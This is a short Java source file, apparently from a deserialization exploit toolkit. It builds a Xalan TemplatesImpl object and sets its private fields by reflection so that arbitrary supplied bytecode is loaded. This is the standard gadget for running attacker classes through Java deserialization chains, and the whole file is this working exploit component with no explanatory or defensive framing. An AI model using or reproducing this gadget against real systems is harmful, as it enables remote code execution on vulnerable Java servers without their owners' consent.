package com.reajason.javaweb.deserialize;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.deserialize.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.jar.asm.Opcodes;

/**
 * @author ReaJason
 * @since 2024/12/9
 */
public class TemplateUtils {

    @SneakyThrows
    public static TemplatesImpl createTemplatesImpl(byte[] bytes) {
        TemplatesImpl templates = new TemplatesImpl();
        byte[] fooBytes;
        try (DynamicType.Unloaded<Object> make = new ByteBuddy()
                .subclass(Object.class).name("foo")
                .visit(new TargetJreVersionVisitorWrapper(Opcodes.V1_6))
                .make()) {
            fooBytes = ClassBytesShrink.shrink(make.getBytes(), true);
        }

        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
                bytes, fooBytes
        });

        Reflections.setFieldValue(templates, "_transletIndex", 0);
        Reflections.setFieldValue(templates, "_name", "SimpleJava");
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }
}
